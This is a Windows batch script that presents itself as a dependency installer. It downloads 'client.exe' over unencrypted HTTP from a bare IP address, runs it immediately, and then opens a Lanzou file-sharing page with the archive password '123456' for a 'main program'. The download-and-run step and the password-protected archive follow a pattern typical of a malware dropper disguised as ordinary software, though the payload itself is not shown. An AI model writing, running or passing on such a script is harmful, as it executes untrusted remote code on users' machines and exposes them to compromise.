@echo off
setlocal EnableExtensions
cd /d "%~dp0"

set "URL_DEP=http://119.29.52.95:5000/download/client.exe"
set "URL_LANZOU=https://wwbuh.lanzoul.com/iwhZ049j7tgf"
set "PASSWORD=123456"

echo ============================================
echo  [1/2] Downloading dependency...
echo ============================================
curl -L --fail --retry 3 --retry-delay 2 --connect-timeout 20 -o "client.exe" "%URL_DEP%"
if errorlevel 1 goto fail
start client.exe

echo.
echo Dependency downloaded: %CD%\client.exe
echo SHA256:
certutil -hashfile "client.exe" SHA256
echo.

echo ============================================
echo  [2/2] Opening browser for main program...
echo ============================================
echo Opening the download page in your default browser...
start "" "%URL_LANZOU%"

echo.
echo ============================================
echo  Download page opened!
echo.
echo  Password: %PASSWORD%
echo.
echo  Please download the file manually from the page,
echo  then run the dependency (client.exe) first.
echo ============================================
echo.
pause
exit /b 0

:fail
echo.
echo Download of dependency failed.
echo Please check your network connection and try again.
pause
exit /b 1